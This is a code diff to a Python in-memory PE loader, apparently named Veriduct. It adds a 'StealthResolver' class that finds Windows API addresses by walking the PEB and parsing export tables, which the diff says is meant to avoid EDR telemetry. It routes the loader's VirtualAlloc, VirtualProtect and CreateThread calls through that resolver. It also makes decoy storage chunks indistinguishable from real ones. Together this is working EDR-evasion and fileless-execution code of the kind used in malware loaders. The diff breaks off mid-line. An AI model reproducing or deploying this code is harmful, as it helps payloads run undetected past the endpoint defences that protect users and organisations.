@@ -163,6 +163,289 @@ class PROCESS_BASIC_INFORMATION(ctypes.Structure):
         ("Reserved3", wintypes.LPVOID),
     ]
 
+class LDR_DATA_TABLE_ENTRY(ctypes.Structure):
+    """Loader data table entry for module enumeration."""
+    pass
+
+LDR_DATA_TABLE_ENTRY._fields_ = [
+    ("InLoadOrderLinks", LIST_ENTRY),
+    ("InMemoryOrderLinks", LIST_ENTRY),
+    ("InInitializationOrderLinks", LIST_ENTRY),
+    ("DllBase", wintypes.LPVOID),
+    ("EntryPoint", wintypes.LPVOID),
+    ("SizeOfImage", wintypes.ULONG),
+    ("FullDllName", UNICODE_STRING),
+    ("BaseDllName", UNICODE_STRING),
+]
+
+
+class StealthResolver:
+    """
+    Resolve Windows API functions without using ctypes.windll (which triggers EDR telemetry).
+    Walks PEB -> LDR -> module list, then parses PE export tables manually.
+    """
+    _instance = None
+    
+    def __new__(cls):
+        if cls._instance is None:
+            cls._instance = super().__new__(cls)
+            cls._instance._initialized = False
+        return cls._instance
+    
+    def __init__(self):
+        if self._initialized:
+            return
+        self._initialized = True
+        self._module_cache = {}  # name.lower() -> base_address
+        self._proc_cache = {}    # (module, func) -> address
+        self._peb = None
+        self._init_from_peb()
+    
+    def _init_from_peb(self):
+        """Walk PEB to find loaded modules. Stealth-only, no fallbacks."""
+        self._fallback_mode = False
+        try:
+            self._bootstrap_peb()
+        except Exception as e:
+            logging.error(f"StealthResolver init failed: {e}")
+            logging.error("Stealth API resolution not available - this is required for operation")
+            raise
+    
+    def _bootstrap_peb(self):
+        """Get PEB address. Try multiple methods for maximum compatibility."""
+        import ctypes.wintypes as wt
+        
+        # Method 1: RtlGetCurrentPeb - simplest, exported by ntdll
+        # This is what PythonForWindows uses and is very reliable
+        try:
+            ntdll = ctypes.windll.ntdll
+            ntdll.RtlGetCurrentPeb.restype = ctypes.c_void_p
+            peb_addr = ntdll.RtlGetCurrentPeb()
+            if peb_addr:
+                self._peb = ctypes.cast(peb_addr, ctypes.POINTER(PEB)).contents
+                logging.debug(f"StealthResolver: Got PEB via RtlGetCurrentPeb at 0x{peb_addr:X}")
+                self._walk_ldr_modules()
+                return
+        except Exception as e:
+            logging.debug(f"RtlGetCurrentPeb failed: {e}")
+        
+        # Method 2: NtQueryInformationProcess - fallback
+        try:
+            NtQueryInformationProcess = ctypes.windll.ntdll.NtQueryInformationProcess
+            GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
+            
+            # Set up proper types
+            NtQueryInformationProcess.argtypes = [
+                ctypes.c_void_p,  # ProcessHandle
+                ctypes.c_ulong,   # ProcessInformationClass
+                ctypes.c_void_p,  # ProcessInformation
+                ctypes.c_ulong,   # ProcessInformationLength
+                ctypes.POINTER(wt.ULONG)  # ReturnLength
+            ]
+            NtQueryInformationProcess.restype = ctypes.c_long
+            
+            GetCurrentProcess.restype = ctypes.c_void_p
+            
+            pbi = PROCESS_BASIC_INFORMATION()
+            ret_len = wt.ULONG()
+            
+            handle = GetCurrentProcess()
+            status = NtQueryInformationProcess(
+                handle, 0, ctypes.byref(pbi),
+                ctypes.sizeof(pbi), ctypes.byref(ret_len)
+            )
+            if status != 0:
+                raise RuntimeError(f"NtQueryInformationProcess failed: {status}")
+            
+            self._peb = pbi.PebBaseAddress.contents
+            logging.debug(f"StealthResolver: Got PEB via NtQueryInformationProcess")
+            self._walk_ldr_modules()
+            return
+        except Exception as e:
+            logging.debug(f"NtQueryInformationProcess failed: {e}")
+        
+        raise RuntimeError("All PEB acquisition methods failed")
+    
+    def _walk_ldr_modules(self):
+        """Walk PEB.Ldr.InMemoryOrderModuleList to find all loaded modules."""
+        ldr = self._peb.Ldr.contents
+        
+        # InMemoryOrderModuleList is a circular doubly-linked list
+        # The list head is embedded in PEB_LDR_DATA, entries are LDR_DATA_TABLE_ENTRY
+        list_head = ctypes.addressof(ldr.InMemoryOrderModuleList)
+        current = ldr.InMemoryOrderModuleList.Flink
+        
+        while ctypes.addressof(current.contents) != list_head:
+            # The LIST_ENTRY is at offset 0x10 in LDR_DATA_TABLE_ENTRY (InMemoryOrderLinks)
+            # So we subtract 0x10 (on x64, or 0x08 on x86) to get the entry base
+            # Actually, for InMemoryOrderLinks which is the second LIST_ENTRY:
+            # Offset = sizeof(LIST_ENTRY) = 16 bytes on x64, 8 bytes on x86
+            entry_offset = ctypes.sizeof(LIST_ENTRY)
+            entry_addr = ctypes.addressof(current.contents) - entry_offset
+            
+            entry = ctypes.cast(entry_addr, ctypes.POINTER(LDR_DATA_TABLE_ENTRY)).contents
+            
+            if entry.DllBase and entry.BaseDllName.Buffer:
+                try:
+                    # Read the DLL name
+                    name_len = entry.BaseDllName.Length // 2  # Length is in bytes, we want chars
+                    dll_name = ctypes.wstring_at(entry.BaseDllName.Buffer, name_len).lower()
+                    base = entry.DllBase
+                    
+                    if isinstance(base, int):
+                        base_int = base
+                    else:
+                        base_int = ctypes.cast(base, ctypes.c_void_p).value
+                    
+                    self._module_cache[dll_name] = base_int
+                    logging.debug(f"StealthResolver: Found {dll_name} at 0x{base_int:X}")
+                except Exception:
+                    pass
+            
+            current = current.contents.Flink
+    
+    def get_module_base(self, module_name: str) -> int:
+        """Get base address of a loaded module via stealth resolution."""
+        name_lower = module_name.lower()
+        
+        if name_lower in self._module_cache:
+            return self._module_cache[name_lower]
+        
+        # Try without extension
+        if not name_lower.endswith('.dll'):
+            if name_lower + '.dll' in self._module_cache:
+                return self._module_cache[name_lower + '.dll']
+        
+        return 0
+    
+    def get_proc_address(self, module_name: str, proc_name: str) -> int:
+        """
+        Get function address by parsing module's export table.
+        Equivalent to GetProcAddress but without API calls - pure stealth.
+        """
+        cache_key = (module_name.lower(), proc_name if isinstance(proc_name, str) else proc_name.decode('ascii'))
+        if cache_key in self._proc_cache:
+            return self._proc_cache[cache_key]
+        
+        base = self.get_module_base(module_name)
+        if not base:
+            logging.warning(f"StealthResolver: Module {module_name} not found in PEB")
+            return 0
+        
+        addr = self._parse_exports(base, proc_name)
+        if addr:
+            self._proc_cache[cache_key] = addr
+        return addr
+    
+    def _parse_exports(self, base: int, proc_name: str) -> int:
+        """Parse PE export table to find function address."""
+        try:
+            # Read DOS header
+            dos_magic = ctypes.string_at(base, 2)
+            if dos_magic != b'MZ':
+                return 0
+            
+            # Get PE header offset
+            pe_offset = struct.unpack('<I', ctypes.string_at(base + 0x3C, 4))[0]
+            pe_sig = ctypes.string_at(base + pe_offset, 4)
+            if pe_sig != b'PE\x00\x00':
+                return 0
+            
+            # Check if PE32 or PE32+
+            magic = struct.unpack('<H', ctypes.string_at(base + pe_offset + 24, 2))[0]
+            is_64 = (magic == 0x20b)
+            
+            # Export directory RVA is at different offsets for PE32 vs PE32+
+            if is_64:
+                export_rva = struct.unpack('<I', ctypes.string_at(base + pe_offset + 24 + 112, 4))[0]
+                export_size = struct.unpack('<I', ctypes.string_at(base + pe_offset + 24 + 116, 4))[0]
+            else:
+                export_rva = struct.unpack('<I', ctypes.string_at(base + pe_offset + 24 + 96, 4))[0]
+                export_size = struct.unpack('<I', ctypes.string_at(base + pe_offset + 24 + 100, 4))[0]
+            
+            if export_rva == 0:
+                return 0
+            
+            export_dir = base + export_rva
+            
+            # Parse IMAGE_EXPORT_DIRECTORY
+            num_functions = struct.unpack('<I', ctypes.string_at(export_dir + 20, 4))[0]
+            num_names = struct.unpack('<I', ctypes.string_at(export_dir + 24, 4))[0]
+            addr_table_rva = struct.unpack('<I', ctypes.string_at(export_dir + 28, 4))[0]
+            name_table_rva = struct.unpack('<I', ctypes.string_at(export_dir + 32, 4))[0]
+            ordinal_table_rva = struct.unpack('<I', ctypes.string_at(export_dir + 36, 4))[0]
+            
+            # Search by name
+            if isinstance(proc_name, str):
+                proc_name_bytes = proc_name.encode('ascii')
+            else:
+                proc_name_bytes = proc_name
+            
+            for i in range(num_names):
+                name_rva = struct.unpack('<I', ctypes.string_at(base + name_table_rva + i * 4, 4))[0]
+                name = ctypes.string_at(base + name_rva)
+                
+                if name == proc_name_bytes:
+                    # Found it - get ordinal, then address
+                    ordinal = struct.unpack('<H', ctypes.string_at(base + ordinal_table_rva + i * 2, 2))[0]
+                    func_rva = struct.unpack('<I', ctypes.string_at(base + addr_table_rva + ordinal * 4, 4))[0]
+                    
+                    # Check for forwarder (RVA points within export section)
+                    if export_rva <= func_rva < export_rva + export_size:
+                        # This is a forwarder - would need to resolve it
+                        # For now, skip forwarders
+                        logging.debug(f"StealthResolver: {proc_name} is a forwarder, skipping")
+                        return 0
+                    
+                    return base + func_rva
+            
+            return 0
+            
+        except Exception as e:
+            logging.debug(f"StealthResolver: Failed to parse exports: {e}")
+            return 0
+    
+    def load_library(self, dll_name: str) -> int:
+        """
+        Load a DLL. For DLLs not already loaded, we unfortunately need LoadLibraryA.
+        But we call it through our resolved address, not ctypes.windll.
+        """
+        # Check if already loaded
+        base = self.get_module_base(dll_name)
+        if base:
+            return base
+        
+        # Need to actually load it - get LoadLibraryA address
+        load_lib_addr = self.get_proc_address("kernel32.dll", "LoadLibraryA")
+        if not load_lib_addr:
+            return 0
+        
+        # Call LoadLibraryA through the resolved address using WINFUNCTYPE
+        LoadLibraryA = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_char_p)(load_lib_addr)
+        
+        if isinstance(dll_name, str):
+            dll_name = dll_name.encode('ascii')
+        
+        handle = LoadLibraryA(dll_name)
+        if handle:
+            handle_int = handle if isinstance(handle, int) else ctypes.cast(handle, ctypes.c_void_p).value
+            # Cache it
+            name_str = dll_name.decode('ascii') if isinstance(dll_name, bytes) else dll_name
+            self._module_cache[name_str.lower()] = handle_int
+            return handle_int
+        return 0
+
+
+# Global resolver instance - initialized lazily on first use
+_stealth_resolver = None
+
+def get_stealth_resolver() -> StealthResolver:
+    """Get or create the global StealthResolver instance."""
+    global _stealth_resolver
+    if _stealth_resolver is None:
+        _stealth_resolver = StealthResolver()
+    return _stealth_resolver
+
 class CRTInitializer:
     def __init__(self, base_addr, stream, is_64bit, load_config_rva=0, load_config_size=0, command_line=None):
         self.base_addr = base_addr
@@ -178,12 +461,31 @@ class CRTInitializer:
     def _get_peb(self):
         if self.peb_ptr is not None:
             return self.peb_ptr
-        ntdll = ctypes.windll.ntdll
-        kernel32 = ctypes.windll.kernel32
+        
+        # Use StealthResolver to get PEB - it already has it cached from initialization
+        resolver = get_stealth_resolver()
+        if hasattr(resolver, '_peb') and resolver._peb is not None:
+            # StealthResolver already has PEB from its bootstrap
+            self.peb_ptr = ctypes.pointer(resolver._peb)
+            return self.peb_ptr
+        
+        # Fallback: resolve functions via stealth and call them
+        NtQueryInformationProcess_addr = resolver.get_proc_address("ntdll.dll", "NtQueryInformationProcess")
+        GetCurrentProcess_addr = resolver.get_proc_address("kernel32.dll", "GetCurrentProcess")
+        
+        if not NtQueryInformationProcess_addr or not GetCurrentProcess_addr:
+            raise RuntimeError("Failed to resolve NtQueryInformationProcess/GetCurrentProcess")
+        
+        NtQueryInformationProcess = ctypes.WINFUNCTYPE(
+            ctypes.c_long, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(wintypes.ULONG)
+        )(NtQueryInformationProcess_addr)
+        
+        GetCurrentProcess = ctypes.WINFUNCTYPE(ctypes.c_void_p)(GetCurrentProcess_addr)
+        
         pbi = PROCESS_BASIC_INFORMATION()
         ret_len = wintypes.ULONG()
-        status = ntdll.NtQueryInformationProcess(
-            kernel32.GetCurrentProcess(), 0, ctypes.byref(pbi),
+        status = NtQueryInformationProcess(
+            GetCurrentProcess(), 0, ctypes.byref(pbi),
             ctypes.sizeof(pbi), ctypes.byref(ret_len))
         if status != 0:
             raise RuntimeError(f"NtQueryInformationProcess failed: {status}")
@@ -482,28 +784,28 @@ def disentangle_chunks(entangled: List[bytes], info: Dict) -> List[bytes]:
 # ==============================================================================
 
 class ChunkStorage:
-    """Robust SQLite chunk storage with better error handling."""
+    """Robust SQLite chunk storage - schema indistinguishable from generic blob store."""
     def __init__(self, db_path: str):
         self.db_path = db_path
         self.conn = sqlite3.connect(self.db_path)
         self.conn.execute("PRAGMA journal_mode=WAL;")
+        # Clean schema: just hash -> blob, no metadata columns
         self.conn.execute("""
             CREATE TABLE IF NOT EXISTS chunks (
                 hash TEXT PRIMARY KEY,
-                data BLOB,
-                is_fake INTEGER DEFAULT 0
+                data BLOB
             )
         """)
         self.conn.commit()
         logging.debug(f"ChunkStorage initialized at {db_path}")
 
-    def store_chunks_batch(self, chunks_to_store: List[Tuple[str, bytes, bool]]):
+    def store_chunks_batch(self, chunks_to_store: List[Tuple[str, bytes]]):
         """Store multiple chunks in a single transaction."""
         if not chunks_to_store:
             return
         with self.conn:
             self.conn.executemany(
-                "INSERT OR REPLACE INTO chunks (hash, data, is_fake) VALUES (?, ?, ?)",
+                "INSERT OR REPLACE INTO chunks (hash, data) VALUES (?, ?)",
                 chunks_to_store
             )
         logging.debug(f"Stored {len(chunks_to_store)} chunks")
@@ -511,15 +813,15 @@ class ChunkStorage:
     def retrieve_chunk(self, salted_chunk_hash: str) -> Optional[bytes]:
         """Retrieve a single chunk by hash."""
         cursor = self.conn.execute(
-            "SELECT data FROM chunks WHERE hash = ? AND is_fake = 0",
+            "SELECT data FROM chunks WHERE hash = ?",
             (salted_chunk_hash,)
         )
         result = cursor.fetchone()
         return result[0] if result else None
 
     def get_chunk_count(self) -> int:
-        """Get total number of real chunks."""
-        cursor = self.conn.execute("SELECT COUNT(*) FROM chunks WHERE is_fake = 0")
+        """Get total number of chunks (real + fake are indistinguishable)."""
+        cursor = self.conn.execute("SELECT COUNT(*) FROM chunks")
         return cursor.fetchone()[0]
 
     def close(self):
@@ -527,16 +829,26 @@ class ChunkStorage:
             self.conn.close()
             logging.debug("ChunkStorage closed")
 
-def generate_fake_chunks(real_chunk_count: int, file_salt: bytes, ratio: float = 0.25) -> List[Tuple[str, bytes, bool]]:
-    """Generate fake chunks for substrate poisoning."""
+def derive_fake_salt(file_salt: bytes) -> bytes:
+    """Derive a separate salt for fake chunks - only keymap holder knows the real salt."""
+    return hmac.new(file_salt, b"veriduct_fake_salt_v1", hashlib.sha256).digest()
+
+def generate_fake_chunks(real_chunk_count: int, file_salt: bytes, ratio: float = 0.25) -> List[Tuple[str, bytes]]:
+    """
+    Generate fake chunks for substrate poisoning.
+    Uses a derived salt so fake chunk hashes are completely disjoint from real chunk hashes.
+    The database cannot distinguish real from fake - only the keymap holder knows which hashes are real.
+    """
+    fake_salt = derive_fake_salt(file_salt)
     count = max(1, int(real_chunk_count * ratio))
     fakes = []
     for _ in range(count):
         fake_len = random.choice([256, 512, 1024, 2048, 4096])
         data = os.urandom(fake_len)
-        h = calculate_salted_chunk_hash(file_salt, data)
-        fakes.append((h, data, True))
-    logging.debug(f"Generated {count} fake chunks")
+        # Hash with derived fake_salt - these hashes will never appear in keymap
+        h = calculate_salted_chunk_hash(fake_salt, data)
+        fakes.append((h, data))
+    logging.debug(f"Generated {count} fake chunks (salt-isolated)")
     return fakes
 
 # ==============================================================================
@@ -647,32 +959,31 @@ class VeriductNativeLoader:
     # PE (Windows) Implementation
     # -------------------------------------------------------------------------
     
-    def _translate_pe_flags_to_page_protect_MAX_ACCESS(self, characteristics):
+    def _translate_pe_section_protection(self, characteristics):
         """
         Translate PE section characteristics flags to Windows page protection constants.
+        Maps section flags to minimum required permissions (no unnecessary RWX).
         """
         can_exec = bool(characteristics & IMAGE_SCN_MEM_EXECUTE)
         can_read = bool(characteristics & IMAGE_SCN_MEM_READ)
         can_write = bool(characteristics & IMAGE_SCN_MEM_WRITE)
 
-        # Prefer the most permissive matching protection that reflects section flags
         if can_exec:
             if can_read and can_write:
-                return PAGE_EXECUTE_READWRITE
+                return PAGE_EXECUTE_READWRITE  # Only if section explicitly needs E+R+W
             if can_read:
-                return PAGE_EXECUTE_READ
+                return PAGE_EXECUTE_READ  # Standard .text section
             if can_write:
-                # uncommon combination (execute + write but not read), choose exec+rw
+                # Uncommon: execute + write but not read
                 return PAGE_EXECUTE_READWRITE
             return PAGE_EXECUTE
 
-        # Non-executable mappings
+        # Non-executable sections
         if can_read and can_write:
-            return PAGE_READWRITE
+            return PAGE_READWRITE  # .data section
         if can_read:
-            return PAGE_READONLY
+            return PAGE_READONLY  # .rdata section
         if can_write:
-            # write-only is unusual; map to read-write for safety
             return PAGE_READWRITE
 
         return PAGE_NOACCESS
@@ -743,35 +1054,54 @@ class VeriductNativeLoader:
             self.is_valid = False
 
     def _execute_pe_windows(self):
-            """Execute PE on Windows with proper memory mapping."""
-            kernel32 = ctypes.windll.kernel32
-    
-            # Set up function signatures
-            kernel32.VirtualAlloc.argtypes = [
-                ctypes.c_void_p,
-                ctypes.c_size_t,
-                ctypes.c_ulong,
-                ctypes.c_ulong
-            ]
-            kernel32.VirtualAlloc.restype = ctypes.c_void_p
-    
-            kernel32.VirtualProtect.argtypes = [
-                ctypes.c_void_p,
-                ctypes.c_size_t,
-                ctypes.c_ulong,
-                ctypes.POINTER(ctypes.c_ulong)
-            ]
-            kernel32.VirtualProtect.restype = ctypes.c_bool
-    
-            kernel32.VirtualFree.argtypes = [
-                ctypes.c_void_p,
-                ctypes.c_size_t,
-                ctypes.c_ulong
-            ]
-            kernel32.VirtualFree.restype = ctypes.c_bool
+            """Execute PE on Windows with proper memory mapping. Uses stealth API resolution."""
+            resolver = get_stealth_resolver()
+            
+            # Resolve all kernel32 functions we need via stealth
+            VirtualAlloc_addr = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
+            VirtualProtect_addr = resolver.get_proc_address("kernel32.dll", "VirtualProtect")
+            VirtualFree_addr = resolver.get_proc_address("kernel32.dll", "VirtualFree")
+            CreateThread_addr = resolver.get_proc_address("kernel32.dll", "CreateThread")
+            WaitForSingleObject_addr = resolver.get_proc_address("kernel32.dll", "WaitForSingleObject")
+            GetExitCodeThread_addr = resolver.get_proc_address("kernel32.dll", "GetExitCodeThread")
+            CloseHandle_addr = resolver.get_proc_address("kernel32.dll", "CloseHandle")
+            
+            if not all([VirtualAlloc_addr, VirtualProtect_addr, VirtualFree_addr]):
+                raise RuntimeError("Failed to resolve required kernel32 functions via stealth resolver")
+            
+            # Create callable function pointers using WINFUNCTYPE for Windows API calling convention
+            # Note: BOOL is c_int (4 bytes), not c_bool (1 byte)
+            VirtualAlloc = ctypes.WINFUNCTYPE(
+                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong
+            )(VirtualAlloc_addr)
+            
+            VirtualProtect = ctypes.WINFUNCTYPE(
+                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
+            )(VirtualProtect_addr)
+            
+            VirtualFree = ctypes.WINFUNCTYPE(
+                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
+            )(VirtualFree_addr)
+            
+            CreateThread = ctypes.WINFUNCTYPE(
+                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p,
+                ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
+            )(CreateThread_addr) if CreateThread_addr else None
+            
+            WaitForSingleObject = ctypes.WINFUNCTYPE(
+                ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong
+            )(WaitForSingleObject_addr) if WaitForSingleObject_addr else None
+            
+            GetExitCodeThread = ctypes.WINFUNCTYPE(
+                ctypes.c_int, ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)
+            )(GetExitCodeThread_addr) if GetExitCodeThread_addr else None
+            
+            CloseHandle = ctypes.WINFUNCTYPE(
+                ctypes.c_int, ctypes.c_void_p
+            )(CloseHandle_addr) if CloseHandle_addr else None
     
             # Allocate memory - let Windows choose the address
-            base_addr = kernel32.VirtualAlloc(
+            base_addr = VirtualAlloc(
                 None,  # Let Windows choose address
                 self.size_of_image,
                 0x3000,  # MEM_COMMIT | MEM_RESERVE
@@ -839,25 +1169,32 @@ class VeriductNativeLoader:
                 # Setup SEH
                 self._setup_seh(base_addr_int)
         
-                # Apply section protections
+                # CRT Initialization (while memory is still RW)
+                crt_init.initialize()
+                
+                # NOW apply final section protections (two-pass: was RW, now set proper perms)
+                # This happens AFTER all writes are complete (imports resolved, relocations applied, CRT init done)
+                logging.debug("Applying final section protections...")
                 for section in sections_to_protect:
-                    protection = self._translate_pe_flags_to_page_protect_MAX_ACCESS(section['char'])
+                    protection = self._translate_pe_section_protection(section['char'])
                     old_protect = ctypes.c_ulong()
-            
-                    # Keep executable sections writable for CRT initialization
-                    if protection in (PAGE_EXECUTE, PAGE_EXECUTE_READ):
-                        protection = PAGE_EXECUTE_READWRITE
-            
+                    
+                    # No RWX fallback - apply proper permissions
+                    # .text -> PAGE_EXECUTE_READ (not RWX)
+                    # .rdata -> PAGE_READONLY
+                    # .data -> PAGE_READWRITE
                     if protection != PAGE_NOACCESS:
-                        kernel32.VirtualProtect(
+                        success = VirtualProtect(
                             section['addr'],
                             section['size'],
                             protection,
                             ctypes.byref(old_protect)
                         )
+                        if success:
+                            logging.debug(f"  Section at 0x{section['addr']:X}: {old_protect.value:#x} -> {protection:#x}")
+                        else:
+                            logging.warning(f"  VirtualProtect failed for section at 0x{section['addr']:X}")
         
-                # CRT Initialization
-                crt_init.initialize()
                 # Execute
                 entry_addr = base_addr_int + self.entry_point_rva
                 logging.info(f"Jumping to entry point: 0x{entry_addr:X}")
@@ -870,7 +1207,7 @@ class VeriductNativeLoader:
                 if is_dll:
                     logging.info("Detected DLL - calling with DllMain signature")
                     # DLL entry point: BOOL WINAPI DllMain(HINSTANCE, DWORD, LPVOID)
-                    ENTRY_FUNC = ctypes.CFUNCTYPE(
+                    ENTRY_FUNC = ctypes.WINFUNCTYPE(
                         ctypes.c_int,
                         ctypes.c_void_p,
                         ctypes.c_ulong,
@@ -892,32 +1229,13 @@ class VeriductNativeLoader:
                     # Run PE in separate thread so ExitThread (hooked from ExitProcess) 
                     # only kills the PE thread, not our Python host
                     
-                    LPTHREAD_START_ROUTINE = ctypes.CFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)
-                    
-                    # CreateThread parameters
-                    kernel32.CreateThread.argtypes = [
-                        ctypes.c_void_p,  # lpThreadAttributes
-                        ctypes.c_size_t,  # dwStackSize
-                        ctypes.c_void_p,  # lpStartAddress (entry point)
-                        ctypes.c_void_p,  # lpParameter
-                        ctypes.c_ulong,   # dwCreationFlags
-                        ctypes.POINTER(ctypes.c_ulong)  # lpThreadId
-                    ]
-                    kernel32.CreateThread.restype = ctypes.c_void_p
-                    
-                    kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
-                    kernel32.WaitForSingleObject.restype = ctypes.c_ulong
-                    
-                    kernel32.GetExitCodeThread.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)]
-                    kernel32.GetExitCodeThread.restype = ctypes.c_int
-                    
-                    kernel32.CloseHandle.argtypes = [ctypes.c_void_p]
-                    kernel32.CloseHandle.restype = ctypes.c_int
+                    if not CreateThread:
+                        raise RuntimeError("CreateThread not resolved")
                     
                     INFINITE = 0xFFFFFFFF
                     
                     logging.info(f"Creating thread at entry point 0x{entry_addr:X}...")
-                    h_thread = kernel32.CreateThread(
+                    h_thread = CreateThread(
                         None,           # Default security
                         0,              # Default stack size  
                         entry_addr,     # Start at PE entry point
@@ -929,18 +1247,22 @@ class VeriductNativeLoader:
                     if not h_thread:
                         raise OSError(f"CreateThread failed: {ctypes.get_last_error()}")
                     
-                    logging.info(f"PE thread started, waiting for completion...")
+                    h_thread_int = h_thread if isinstance(h_thread, int) else ctypes.cast(h_thread, ctypes.c_void_p).value
+                    logging.info(f"PE thread started (handle: 0x{h_thread_int:X}), waiting for completion...")
                     
                     # Wait for PE to finish (will call ExitThread due to our hook)
-                    wait_result = kernel32.WaitForSingleObject(h_thread, INFINITE)
+                    if WaitForSingleObject:
+                        wait_result = WaitForSingleObject(h_thread_int, INFINITE)
                     
                     # Get exit code
                     exit_code = ctypes.c_ulong(0)
-                    kernel32.GetExitCodeThread(h_thread, ctypes.byref(exit_code))
+                    if GetExitCodeThread:
+                        GetExitCodeThread(h_thread_int, ctypes.byref(exit_code))
                     result = exit_code.value
                     
                     # Cleanup
-                    kernel32.CloseHandle(h_thread)
+                    if CloseHandle:
+                        CloseHandle(h_thread_int)
                     
                     logging.info(f"PE thread exited with code: {result}")
 
@@ -952,7 +1274,7 @@ class VeriductNativeLoader:
                 
                 # Free the PE memory
                 try:
-                    kernel32.VirtualFree(base_addr, 0, 0x8000)  # MEM_RELEASE
+                    VirtualFree(base_addr, 0, 0x8000)  # MEM_RELEASE
                 except:
                     pass
                     
@@ -964,7 +1286,7 @@ class VeriductNativeLoader:
                 except:
                     pass
                 try:
-                    kernel32.VirtualFree(base_addr, 0, 0x8000)  # MEM_RELEASE
+                    VirtualFree(base_addr, 0, 0x8000)  # MEM_RELEASE
                 except:
                     pass
                 logging.error(f"PE execution failed: {e}")
@@ -1025,20 +1347,20 @@ class VeriductNativeLoader:
         
         logging.info(f"Setting up argv hooks: argc={argc}, argv={args}")
         
-        # Allocate persistent memory for:
-        # 1. The argc integer (4 bytes, but aligned to 8)
-        # 2. The argv pointer array (char**)
-        # 3. The actual argument strings
+        resolver = get_stealth_resolver()
+        VirtualAlloc_addr = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
+        if not VirtualAlloc_addr:
+            logging.error("Failed to resolve VirtualAlloc for argv hooks")
+            return None, None
         
-        kernel32 = ctypes.windll.kernel32
-        
-        # CRITICAL: Set proper return types for 64-bit pointers
-        kernel32.VirtualAlloc.restype = ctypes.c_void_p
+        VirtualAlloc = ctypes.WINFUNCTYPE(
+            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong
+        )(VirtualAlloc_addr)
         
         MEM_COMMIT = 0x1000
         MEM_RESERVE = 0x2000
-        PAGE_READWRITE = 0x04
-        PAGE_EXECUTE_READWRITE = 0x40
+        PAGE_READWRITE_LOCAL = 0x04
+        PAGE_EXECUTE_READWRITE_LOCAL = 0x40
         
         # Calculate total size needed
         # - 8 bytes for argc (4 byte int + 4 padding for alignment)
@@ -1049,19 +1371,21 @@ class VeriductNativeLoader:
         total_size = 8 + argv_array_size + string_data_size + 64  # +64 padding
         
         # Allocate data memory
-        data_mem = kernel32.VirtualAlloc(None, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+        data_mem = VirtualAlloc(None, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE_LOCAL)
         if not data_mem:
             logging.error("Failed to allocate memory for argv data")
             return None, None
+        
+        data_mem_int = data_mem if isinstance(data_mem, int) else ctypes.cast(data_mem, ctypes.c_void_p).value
         
         # Layout:
         # [0:4] = argc (int, 4 bytes)
         # [8:8+argv_array_size] = argv array (char**) - start at offset 8 for alignment
         # [8+argv_array_size:] = string data
         
-        argc_ptr = data_mem
-        argv_array_ptr = data_mem + 8
-        string_ptr = data_mem + 8 + argv_array_size
+        argc_ptr = data_mem_int
+        argv_array_ptr = data_mem_int + 8
+        string_ptr = data_mem_int + 8 + argv_array_size
         
         # Write argc as 4-byte int
         ctypes.memmove(argc_ptr, struct.pack('<i', argc), 4)
@@ -1084,7 +1408,7 @@ class VeriductNativeLoader:
         # Store for later reference (prevent garbage collection issues)
         self._argc_ptr = argc_ptr
         self._argv_ptr = argv_array_ptr
-        self._argv_data_mem = data_mem
+        self._argv_data_mem = data_mem_int
         
         # Now create the hook stubs
         # __p___argc returns int* (pointer to argc)
@@ -1101,25 +1425,29 @@ class VeriductNativeLoader:
         # We need to return a pointer TO the argv array pointer
         # So we need another level of indirection
         # Allocate 8 bytes to hold the argv_array_ptr value
-        argv_ptr_ptr = kernel32.VirtualAlloc(None, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
-        ctypes.memmove(argv_ptr_ptr, struct.pack('<Q', argv_array_ptr), 8)
-        self._argv_ptr_ptr = argv_ptr_ptr
+        argv_ptr_ptr = VirtualAlloc(None, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE_LOCAL)
+        argv_ptr_ptr_int = argv_ptr_ptr if isinstance(argv_ptr_ptr, int) else ctypes.cast(argv_ptr_ptr, ctypes.c_void_p).value
+        ctypes.memmove(argv_ptr_ptr_int, struct.pack('<Q', argv_array_ptr), 8)
+        self._argv_ptr_ptr = argv_ptr_ptr_int
         
-        argv_stub = b'\x48\xB8' + struct.pack('<Q', argv_ptr_ptr) + b'\xC3'
+        argv_stub = b'\x48\xB8' + struct.pack('<Q', argv_ptr_ptr_int) + b'\xC3'
         
         # Allocate executable memory for stubs
-        argc_hook = kernel32.VirtualAlloc(None, len(argc_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-        argv_hook = kernel32.VirtualAlloc(None, len(argv_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+        argc_hook = VirtualAlloc(None, len(argc_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE_LOCAL)
+        argv_hook = VirtualAlloc(None, len(argv_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE_LOCAL)
         
-        if argc_hook:
-            ctypes.memmove(argc_hook, argc_stub, len(argc_stub))
-            logging.info(f"Created __p___argc hook at 0x{argc_hook:X}")
+        argc_hook_int = argc_hook if isinstance(argc_hook, int) else ctypes.cast(argc_hook, ctypes.c_void_p).value if argc_hook else 0
